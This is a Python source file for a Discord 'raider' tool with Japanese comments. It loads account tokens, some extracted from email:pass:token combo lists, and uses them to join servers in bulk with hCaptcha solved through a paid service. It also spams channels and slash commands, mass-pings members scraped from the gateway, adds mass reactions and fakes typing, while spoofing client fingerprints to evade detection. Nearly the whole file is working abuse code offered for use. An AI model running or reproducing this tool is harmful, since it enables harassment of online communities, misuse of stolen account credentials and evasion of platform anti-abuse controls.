# Copyright (c) 2025 AtsuageZ
# Licensed under the Custom License - Non-commercial use only, attribution required.

import tkinter.messagebox
import requests
import threading
import time
import os
import uuid
import random
import base64
import json
import websocket
import tkinter
import re
import wmi
import tls_client
import toml
import concurrent.futures
from datetime import datetime
from urllib.parse import urlencode, urlparse, parse_qs
from datetime import datetime
import customtkinter as ctk
from concurrent.futures import ThreadPoolExecutor, as_completed

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
END = '\033[39m'

# 一部スキッドあり

spamming = False
spammingOLD = False
stop_spamming = False  # ああ、DMのやつ。名前を変えるのは今更めんどくさい
stop_custom_spam = False
config = toml.load('config.toml')
API_KEY = config['settings']['api_key']
site_key = "a9b5fb07-92ff-493f-86fe-352a2803b3df"  # サーバー参加時のcaptchaサイトキー (このサイトキーが一部でブロックされるcapsolveサービスがあるので気をつけてください。)

PICTURE_FOLDER = 'avatar'

with open('tokens.txt', 'r') as file:
    tokens1 = [line.strip() for line in file]

TIMEnow = datetime.now()
BASE_URL = "https://discord.com/api/v9"
IMAGE_FOLDER = "avatar"

with open('tokens.txt', 'r') as f:
    tokens = [token.strip() for token in f.readlines()]

token_count = len(tokens)

with open('custom.txt', 'r', encoding='utf-8') as f:
    messages = [line.strip() for line in f.readlines() if line.strip()]

with open('bot.txt', 'r', encoding='utf-8') as f:
    BOTmessages = [line.strip() for line in f.readlines() if line.strip()]

def noncegen():
    return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)

def nowtime():
    return time.strftime("%H:%M:%S")

def generate_precise_state(guild_id): #Bedrock Bypass用のStateを生成。
    guild_int = int(guild_id)
    
    MASK64 = 0xFFFFFFFFFFFFFFFF

    guild_high = (guild_int >> 48) & MASK64
    guild_mid = (guild_int >> 32) & MASK64
    guild_low = (guild_int >> 16) & MASK64
    guild_ext = guild_int & MASK64

    combined1 = (
        (guild_high << 48) |
        (guild_mid << 32) |
        (guild_low << 16) |
        guild_ext
    )
    
    final_state = f"{combined1:016X}"

    return final_state

def extract_invite_code(url):
    try:
        parsed_url = urlparse(url)
        path = parsed_url.path.strip('/')  
        if path.startswith('invite/'):
            return path.split('/')[-1]
        elif path:
            return path
        else:
            return None
    except Exception as e:
        print(f"Error extracting invite code: {e}")
        return None

def validate_token(token):
    return True

def create_session():
    session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
    return session

session = create_session()

def get_headers(token):
    cookies = get_discord_cookies()
    props = get_super_properties()
    return {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "ja-JP,ja;q=0.9",
        "authorization": token,
        "cookie": cookies,
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-discord-locale": "ja",
        'x-debug-options': 'bugReporterEnabled',
        "x-super-properties": props,
    }

def get_discord_cookies():
    try:
        response = requests.get("https://discord.com")
        if response.status_code == 200:
            return "; ".join(
                [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
            ) + "; locale=en-US"
        else:
            return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
    except Exception as e:
        print(f"(ERR) {e} (get_discord_cookies)")

cookies = get_discord_cookies()

def get_super_properties(): #ここは確かこてつから貰いました。
    try:
        payload = {
            "os": "Windows",
            "browser": "Discord Client",
            "release_channel": "stable",
            "client_version": "1.0.9028",
            "os_version": "10.0.19045",
            "system_locale": "en",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "browser_version": "22.3.26",
            "client_build_number": 256231,
            "native_build_number": 41936,
            "client_event_source": None,
        }
        properties = base64.b64encode(json.dumps(payload).encode()).decode()
        return properties
    except Exception as e:
        print(f"(ERR) {e} (get_super_properties)")

properties = get_super_properties()

def headers(token, cookies):
    return {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "ja",
        "authorization": token,
        "cookie": cookies,
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "x-discord-locale": "ja",
        'x-debug-options': 'bugReporterEnabled',
        "x-super-properties": properties,
    }

def solve_hcaptcha(sitekey, invite):
    payload = {
        "clientKey": API_KEY,
        "task": {
            "type": 'HCaptchaTaskProxyLess',
            "websiteKey": sitekey,
            "websiteURL": invite
        }
    }
    response = requests.post("https://api.capsolver.com/createTask", json=payload)
    response_data = response.json()
    task_id = response_data.get("taskId")
    if not task_id:
        print(f"(ERR) Failed to create task: {response.text}")
        return None
    print(f"Got taskId: {task_id} / Getting result...")

    while True:
        time.sleep(1)
        result_response = requests.post("https://api.capsolver.com/getTaskResult", json={"clientKey": API_KEY, "taskId": task_id})
        result_data = result_response.json()
        if result_data.get("status") == "ready":
            return result_data.get("solution", {}).get('gRecaptchaResponse')
        if result_data.get("status") == "failed" or result_data.get("errorId"):
            print(f"Solve failed! response: {result_response.text}")
            return None
    
def join_discord_server(token, invite, use_captcha): # Joinerに3ヶ月かかってます。時給に見合いません。時給3円くらいですか？
    try:
        payload = {"session_id": uuid.uuid4().hex}
        response = session.post(
            f"https://canary.discord.com/api/v10/invites/{invite}",
            headers=get_headers(token),
            json=payload
        )
        hide_token = token[:25].rstrip() + '#'
        
        if response.status_code == 200:
            status = f"{GREEN}[参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
        elif response.status_code == 400:
            status = f"{YELLOW}[キャプチャ]{MAGENTA}{hide_token}{END}{invite}"
            if use_captcha:
                hcaptcha_response = solve_hcaptcha(site_key, invite)
                if hcaptcha_response:
                    payload['captcha_key'] = hcaptcha_response
                    response = session.post(
                        f"https://canary.discord.com/api/v9/invites/{invite}",
                        headers=get_headers(token),
                        json=payload
                    )
                    if response.status_code == 200:
                        status = f"{GREEN}[CAPTCHAを解決し、参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
                    else:
                        status = f"{RED}FAILED{token[:25]}##{response.json().get('message')}"
                else:
                    status = f"{RED}CAPTCHA解決失敗{token[:25]}##"
            else:
                status = f"{YELLOW}CAPTCHA認証が必要{MAGENTA}{hide_token}{END}{invite}"
        elif response.status_code == 429:
            status = f"{BLUE}[クラウドフレア]{MAGENTA}{hide_token}{END}{invite}"
        else:
            status = f"{RED}FAILED{token[:25]}##{response.json().get('message')}"
    except Exception as e:
        status = f"FAILED {token[:25]}## {e}"
    
    return status

def joiner(token, invite_code, use_captcha):
    status = join_discord_server(token, invite_code, use_captcha)
    print(status)

def leaver(server_id):
    for token in tokens:
        hide_token = token[:25].rstrip() + '#'
        headers = {'Authorization': token}
        response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers=headers)
        if response.status_code == 204:
            print(f'サーバーから退出しました。:{hide_token}')

def spammerOLD(channel_id, message):
    global spammingOLD
    spammingOLD = True
    os.system('title Nothing Raider - Spammer Discord.gg/QRNutfWSpK')
    def spam_thread():
        while spammingOLD:
            for token in tokens:
                hide_token = token[:25].rstrip() + '#'
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                data = {'content': message}
                
                try:
                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                    
                    if response.status_code == 200:
                        print(nowtime() + MAGENTA + f'Send: {hide_token}' + END)
                    elif response.status_code == 429:
                        retry_after = response.json()['retry_after']
                        print(nowtime() + YELLOW + f'[RATE LIMIT] Retrying after {retry_after} seconds.' + END)
                        time.sleep(retry_after)
                    else:
                        print(nowtime() + RED + f'Failed to send message with token {hide_token}. Status code: {response.status_code}' + END)
                
                except requests.exceptions.RequestException as e:
                    print(f'Error occurred while sending message with token {hide_token}: {str(e)}')

    threads = []
    for _ in range(10):
        t = threading.Thread(target=spam_thread)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Utilsクラス
class Utils:
    @staticmethod
    def get_ranges(start, step, total):
        ranges = []
        for i in range(start, total, step):
            ranges.append([i, min(i + step - 1, total - 1)])
        return ranges

    @staticmethod
    def parse_member_list_update(decoded):
        data = decoded["d"]
        return {
            "guild_id": data["guild_id"],
            "types": [op["op"] for op in data["ops"]],
            "updates": [op.get("items", []) for op in data["ops"]]
        }

# トークンがギルドに参加しているか確認する関数（シングルスレッド版）
def check_token_in_guild(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, timeout=5)
        if response.status_code == 200:
            print(GREEN + f"Token {token[:25]}... is in guild {guild_id}" + END)
            return True
        else:
            print(YELLOW + f"Token {token[:25]}... not in guild {guild_id} (Status: {response.status_code})" + END)
            return False
    except requests.exceptions.RequestException as e:
        print(RED + f"Error checking token {token[:25]}...: {e}" + END)
        return False

# マルチスレッドでトークンを確認する関数
def check_tokens_in_guild_multithread(tokens, guild_id, max_workers=10):
    valid_tokens = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 各トークンに対してチェックを並行実行
        future_to_token = {executor.submit(check_token_in_guild, token, guild_id): token for token in tokens}
        
        # 結果を収集
        for future in as_completed(future_to_token):
            token = future_to_token[future]
            try:
                if future.result():  # Trueならギルドに参加している
                    valid_tokens.append(token)
            except Exception as e:
                print(RED + f"Exception for token {token[:25]}...: {e}" + END)
    
    return valid_tokens

# DiscordSocketクラス（メンバー取得用）
class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", 
                                "1273658880039190581", "1308012310396407828", "1326906424873193586", 
                                "1334512667456442411"}
        self.members = {}
        self.guilds = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0
        self.end_scraping = False

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
            on_error=self.on_error,
        )

    def run(self):
        print(f"Starting WebSocket for guild {self.guild_id} with token {self.token[:25]}...")
        self.run_forever()
        self.save_members_to_file()
        return self.members

    def save_members_to_file(self):
        try:
            os.makedirs("pings", exist_ok=True)
            filepath = f"pings/{self.guild_id}.txt"
            with open(filepath, "w", encoding="utf-8") as f:
                if not self.members:
                    print(YELLOW + f"No members scraped for guild {self.guild_id}" + END)
                    f.write("")
                else:
                    for user_id in self.members.keys():
                        f.write(f"{user_id}\n")
                    print(GREEN + f"Saved {len(self.members)} member IDs to {filepath}" + END)
        except Exception as e:
            print(RED + f"Failed to save members to file: {e}" + END)

    def scrape_users(self):
        if not self.end_scraping:
            print(f"Scraping users with range {self.ranges}")
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))

    def on_open(self, ws):
        print(GREEN + "WebSocket connection opened" + END)
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                },
                "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
                "compress": False,
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return
        self.packets_recv += decoded["op"] != 11
        if decoded["op"] == 10:
            threading.Thread(target=self.heartbeat_thread, args=(decoded["d"]["heartbeat_interval"] / 1000,), daemon=True).start()
            print(f"Heartbeat interval set to {decoded['d']['heartbeat_interval'] / 1000} seconds")
        if decoded["t"] == "READY":
            self.guilds.update({guild["id"]: {"member_count": guild["member_count"]} for guild in decoded["d"]["guilds"]})
            print(f"Guilds loaded: {self.guilds}")
        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
            self.scrape_users()
        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        print(YELLOW + "No more updates, ending scrape" + END)
                        break
                    self.process_members(parsed["updates"][i])
                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
                time.sleep(0.65)
                self.scrape_users()
        if self.end_scraping:
            self.close()

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {"tag": f"{user.get('username')}#{user.get('discriminator')}", "id": user_id}
        print(f"Processed members, current count: {len(self.members)}")

    def on_close(self, ws, close_code, close_msg):
        print(GREEN + f"WebSocket closed. Scraped {len(self.members)} members" + END)

    def on_error(self, ws, error):
        print(RED + f"WebSocket error: {error}" + END)

# メンバーIDをファイルから読み込む関数
def load_members_from_file(guild_id):
    filepath = f"pings/{guild_id}.txt"
    member_ids = []
    if os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            member_ids = [line.strip() for line in f if line.strip()]
        print(GREEN + f"Loaded {len(member_ids)} member IDs from {filepath}" + END)
    else:
        print(YELLOW + f"No member file found for guild {guild_id}" + END)
    return member_ids

# スパム機能（マスピング対応）
spamming = False

def spammer(channel_id, message, guild_id=None, mass_ping=False, ping_count=0):
    os.system('title Nothing Raider - Spammer Discord.gg/QRNutfWSpK')
    global spamming
    spamming = True

    # ギルドに参加しているトークンをマルチスレッドで確認
    valid_tokens = check_tokens_in_guild_multithread(tokens, guild_id) if guild_id else tokens
    if not valid_tokens:
        print(RED + "No valid tokens found for this guild. Aborting." + END)
        return

    # マスピングが有効な場合、ファイルからメンバーIDを読み込む
    member_ids = []
    if mass_ping and guild_id:
        member_ids = load_members_from_file(guild_id)
        if not member_ids:
            print(YELLOW + "No members found. Scraping now with a valid token..." + END)
            socket = DiscordSocket(valid_tokens[0], guild_id, channel_id)
            threading.Thread(target=socket.run, daemon=True).start()
            time.sleep(15)
            member_ids = list(socket.members.keys())

    def spam_with_token(token):
        hide_token = token[:25].rstrip() + '#'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}

        final_message = message
        if mass_ping and member_ids:
            pings = [f"<@{random.choice(member_ids)}>" for _ in range(min(ping_count, len(member_ids)))]
            final_message = f"{message} {' '.join(pings)}"

        data = {'content': final_message}

        try:
            response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
            if response.status_code == 200:
                print(GREEN + "[Success!]" + MAGENTA + hide_token + END)
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                print(YELLOW + "[RATELIMIT]" + MAGENTA + hide_token + END)
                time.sleep(retry_after)
                spam_with_token(token)
            elif response.status_code in [401, 403]:
                print(RED + f'Missing access token' + hide_token + END)
                return
            else:
                print(f'Failed to send message with token {hide_token}. Status code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error occurred with token {hide_token}: {str(e)}')

    def spam_loop(tokens):
        while spamming:
            threads = []
            for token in valid_tokens:
                t = threading.Thread(target=spam_with_token, args=(token,))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()

    threading.Thread(target=spam_loop, args=(valid_tokens,), daemon=True).start()

spamming = False
forbidden_channels = set()

# コマンドIDを取得する関数（ギルドコマンドとグローバルコマンドを試す）
def get_command_id(token, guild_id, application_id, command_name):
    headers = get_headers(token)
    
    # 1. ギルドコマンドを試す
    try:
        response = requests.get(
            f"{BASE_URL}/guilds/{guild_id}/commands",
            headers=headers
        )
        print(f"Guild commands response: {response.status_code}, {response.text}")
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                if cmd["application_id"] == application_id and cmd["name"] == command_name:
                    print(f"Found command: {cmd['name']} with ID: {cmd['id']}")
                    return cmd["id"]
            print(f"Command '{command_name}' not found in guild {guild_id} for application {application_id}")
        else:
            print(f"Failed to fetch guild commands. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching guild commands: {str(e)}")

    # 2. グローバルコマンドを試す
    try:
        response = requests.get(
            f"{BASE_URL}/applications/{application_id}/commands",
            headers=headers
        )
        print(f"Global commands response: {response.status_code}, {response.text}")
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                if cmd["name"] == command_name:
                    print(f"Found global command: {cmd['name']} with ID: {cmd['id']}")
                    return cmd["id"]
            print(f"Command '{command_name}' not found globally for application {application_id}")
        else:
            print(f"Failed to fetch global commands. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching global commands: {str(e)}")
    
    return None

# スラッシュコマンド送信関数
def send_slash_command(token, guild_id, channel_id, application_id, command_id, command_name, session_id):
    headers = get_headers(token)
    files = {
        'payload_json': (None, json.dumps({
            "type": 2,
            "application_id": application_id,
            "guild_id": guild_id,
            "channel_id": channel_id,
            "session_id": session_id,
            "data": {
                "version": "1350656899955032086",
                "id": command_id,
                "name": command_name,
                "type": 1,
                "options": [],
                "application_command": {
                    "id": command_id,
                    "type": 1,
                    "application_id": application_id,
                    "version": "1350656899955032086",
                    "name": command_name,
                    "description": f"{command_name} command",
                    "dm_permission": True,
                    "integration_types": [0],
                    "global_popularity_rank": 2,
                    "options": [],
                    "description_localized": f"{command_name} command",
                    "name_localized": command_name
                },
                "attachments": []
            },
            "nonce": noncegen(),
            "analytics_location": "slash_ui"
        }))
    }

    try:
        response = requests.post(
            f"{BASE_URL}/interactions",
            headers=headers,
            files=files
        )
        if response.status_code == 204:
            print(f"[Success] Slash command '{command_name}' sent!")
        else:
            print(f"Failed to send slash command '{command_name}'. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending slash command '{command_name}': {str(e)}")

# スラッシュコマンドのスパム関数
def slash_command_spammer(guild_id, channel_id, application_id, command_id, command_name, session_id, tokens):
    os.system(f'title Slash Command Spammer - {command_name}')
    global spamming
    spamming = True

    def spam_with_token(token):
        hide_token = token[:25].rstrip() + '#'
        while spamming:
            send_slash_command(token, guild_id, channel_id, application_id, command_id, command_name, session_id)
            time.sleep(0.5)

    def spam_loop(tokens):
        threads = []
        for token in tokens:
            t = threading.Thread(target=spam_with_token, args=(token,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    threading.Thread(target=spam_loop, args=(tokens,)).start()

# スパム停止関数
def stop_spammer():
    global spamming
    spamming = False
    print("Spamming stopped.")
    
def get_guild_channels(guild_id, token):
    cookies = get_discord_cookies()
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers(token, cookies))
        if response.status_code == 200:
            return [channel for channel in response.json() if channel['type'] == 0 or channel['type'] == 5]
        else:
            print(f'トークン {token} でサーバーのチャンネルを取得できませんでした。ステータスコード: {response.status_code}')
            return []
    except requests.exceptions.RequestException as e:
        print(f'トークン {token} でサーバーのチャンネルを取得中にエラーが発生しました: {str(e)}')
        return []

def send_message(channel_id, header, message):
    nowtime = str(datetime.now())[:-7]
    data = {'content': message}

    try:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/messages",
            headers=header,
            json=data
        )

        if response.status_code == 200:
            print(f'{nowtime} 送信成功: チャンネル {channel_id}')
        elif response.status_code == 403:
            print(f'{nowtime} チャンネル {channel_id} に送信する権限がないため、パスします。')
            forbidden_channels.add(channel_id)
        elif response.status_code == 404:
            print(f'{nowtime} チャンネル {channel_id} が見つかりません。スキップします。')
            forbidden_channels.add(channel_id)  # 無効なチャンネルを記録
        elif response.status_code == 429:
            retry_after = response.json().get('retry_after', 1)
            print(f'{nowtime} [レートリミット] {retry_after} 秒後に再試行します。')
            time.sleep(retry_after)
            send_message(channel_id, header, message)  # 再試行
        else:
            print(f'{nowtime} メッセージ送信失敗: {response.status_code} - {response.text}')
    except requests.exceptions.RequestException as e:
        print(f'{nowtime} メッセージ送信中にエラー: {str(e)}')

# Worker function for threads
def worker(channel_id, header, message):
    send_message(channel_id, header, message)

def format_changer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    format_msg = ctk.CTkLabel(frame, text="email:pass:tokenのtokenを抽出するようになってます\n修正してほしかったら教えて")
    format_msg.pack(pady=5)
    format_changer_button = ctk.CTkButton(master=content_frame, text="Start", command=format_changer)
    format_changer_button.pack(pady="150")

def format_changer(file_pathy: str = "format.txt", output_file: str = "tokens.txt"):
    """
    Extract the token part from lines in a file in the format email:pass:token,
    and save the tokens to another file. Also remove the processed lines from the original file.

    Args:
        file_pathy (str): The path to the file containing lines in the format email:pass:token.
        output_file (str): The path to the file where extracted tokens will be saved.

    Returns:
        list: The list of extracted tokens
    """
    tokens = []
    failed_count = 0  # Count of failed lines (lines that do not have 3 parts)
    successful_lines = []  # To keep track of lines that were processed successfully

    try:
        with open(file_pathy, 'r') as file:
            lines = file.readlines()  # Read all lines at once
            for line in lines:
                parts = line.strip().split(':', 2)  # Split line by ':'
                if len(parts) == 3:
                    tokens.append(parts[-1])  # Extract the token (last part)
                    successful_lines.append(line)  # Track the successfully processed line
                else:
                    failed_count += 1  # Count failed lines

        if tokens:
            with open(output_file, 'a') as output:  # Append mode to add tokens without overwriting
                for token in tokens:
                    output.write(token + '\n')

            print(f"Successfully added {len(tokens)} tokens to {output_file}.")
        else:
            print("No tokens extracted.")
        
        if successful_lines:
            # Create a new list with the remaining lines (those that were not processed)
            remaining_lines = [line for line in lines if line not in successful_lines]

            # Rewrite the original file with only the remaining lines
            with open(file_pathy, 'w') as file:
                file.writelines(remaining_lines)

            print(f"Successfully removed {len(successful_lines)} processed lines from {file_pathy}.")

        print(f"Failed to process {failed_count} lines.")
        
    except FileNotFoundError:
        print("File not found:", file_pathy)
    except Exception as e:
        print("An error occurred:", e)

# 全チャンネルスパム関数（修正版）
def all_channel_spam(server_id, message):
    global stop_spammer
    stop_spammer = False

    # ギルドに参加しているトークンを確認
    valid_tokens = check_tokens_in_guild_multithread(tokens, server_id)
    if not valid_tokens:
        print(RED + f"No valid tokens found for guild {server_id}. Aborting." + END)
        return

    # 最大ワーカー数をトークン数とチャンネル数に応じて調整
    max_workers = min(100, len(valid_tokens) * 2)  # レート制限を考慮しつつ最適化

    while not stop_spammer:
        for token in valid_tokens:
            channels = get_guild_channels(server_id, token)
            if not channels:
                print(YELLOW + f'トークン {token[:25]}... で有効なチャンネルが見つかりませんでした。スキップします。' + END)
                continue

            # テキストチャンネルのみをフィルタリング
            text_channels = [ch for ch in channels if ch.get('type') == 0 and ch.get('id') not in forbidden_channels]
            if not text_channels:
                print(YELLOW + f"トークン {token[:25]}... で有効なテキストチャンネルが見つかりませんでした。" + END)
                continue

            # ThreadPoolExecutorで全チャンネルに同時送信
            cookies = get_discord_cookies()  # 仮定: クッキー取得関数
            header = headers(token, cookies)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [
                    executor.submit(send_message, channel['id'], header, message)
                    for channel in text_channels
                ]

                # 結果を待機しエラーを処理
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(RED + f"スレッドでエラー発生: {e}" + END)

def stop_all_channel_spam():
    global stop_spammer
    stop_spammer = True  # この関数が呼ばれるとstop_spammerをTrueにしてスパムを停止

def write_tokens(filename, tokens):
    with open(filename, 'w') as file:
        file.write("\n".join(tokens))

def is_token_valid(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(nowtime() + RED + f'チェックが不可能なtoken: {token}. {str(e)}' + END)
        return False

def check_and_remove_invalid_tokens():
    global tokens
    valid_tokens = []
    invalid_tokens = []

    def check_token(token):
        if is_token_valid(token):
            valid_tokens.append(token)
            print(nowtime() + GREEN + f' [有効]: {token}' + END)
        else:
            invalid_tokens.append(token)
            print(nowtime() + RED + f'無効なtoken: {token}' + END)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=check_token, args=(token,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    write_tokens('tokens.txt', valid_tokens)
    if invalid_tokens:
        with open('invalid_tokens.txt', 'w') as file:
            file.write("\n".join(invalid_tokens))

    tkinter.messagebox.showinfo("Info", f"Tokenチェックが完了しました。削除したtokenの数{len(tokens) - len(valid_tokens)}個")
    
    if len(valid_tokens) != len(tokens):
        print(f'削除したtokenの数{len(tokens) - len(valid_tokens)}個 無効なtokenを削除しました。')
        tokens = valid_tokens
        
        with open('tokens.txt', 'w') as f:
            f.write('\n'.join(tokens))
        
        print('tokens.txtはアップデートされました。')

def get_existing_reactions(channel_id, message_id, token):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    }

    try:
        response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions', headers=headers)

        if response.status_code == 200:
            reactions_data = response.json()
            existing_reactions = [reaction['emoji']['name'] for reaction in reactions_data]
            return existing_reactions

        else:
            print(f'Failed to fetch reactions from message. Status code: {response.status_code}')
            return []

    except Exception as e:
        print(f'Exception occurred while fetching reactions with token: {token}. Error: {str(e)}')
        return []

def react_with_token(token, channel_id, message_id, emoji):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    }

    url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'

    response = requests.put(url, headers=headers)
    hide_token = token[:25].rstrip() + '#'
    if response.status_code == 204:
        print(f'リアクションに成功 {emoji} : {hide_token}')
    elif response.status_code == 404:
        print(f'Failed to react with {emoji} (メッセージが存在しません): {hide_token}')
    elif response.status_code == 403:
        print(f'Failed to react with {emoji} : {hide_token}')
    else:
        print(f'Failed to react with {emoji} ステータスコード: {response.status_code}): {hide_token}')

def react_to_message(channel_id, message_id, emoji):
    threads = []
    for token in tokens:
        thread = threading.Thread(target=react_with_token, args=(token, channel_id, message_id, emoji))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

threads = []
stop_event = threading.Event()

def fake_typer(channel_id, token):
    url = f'https://discord.com/api/v9/channels/{channel_id}/typing'
    headers = {
        'Authorization': token,
    }

    while not stop_event.is_set():
        try:
            hide_token = token[:25].rstrip() + '#'
            response = requests.post(url, headers=headers)
            response.raise_for_status()
            print(f"fake typeに成功 {channel_id} | {hide_token}")
            time.sleep(5)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTPエラー: {errh}")
            break
        except requests.exceptions.ConnectionError as errc:
            print(f"接続できません: {errc}")
            break
        except requests.exceptions.Timeout as errt:
            print(f"タイムアウトエラー: {errt}")
            break
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            break

def custom_spammer(channel_id):
    global stop_custom_spammer
    stop_custom_spammer = False
    threads = []

    def spam_logic():
        while not stop_custom_spammer:  # stop_custom_spammer が True の場合、ループを抜ける
            for token in tokens:
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                random_custom = random.choice(messages)
                data = {'content': f'{random_custom}'}
                
                try:
                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                    
                    if response.status_code == 200:
                        print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
                        time.sleep(0.7)  # 短い待機時間で速度を維持
                    elif response.status_code == 429:
                        retry_after = response.json().get('retry_after', 1)
                        print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                        time.sleep(retry_after)
                    else:
                        print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)
                
                except requests.exceptions.RequestException as e:
                    print(f'Error occurred while sending message with token {token}: {str(e)}')

    # スレッド数を調整（例: 5スレッド）
    for _ in range(5):
        t = threading.Thread(target=spam_logic)
        t.start()
        threads.append(t)

    # 全スレッドが終了するのを待機
    for t in threads:
        t.join()

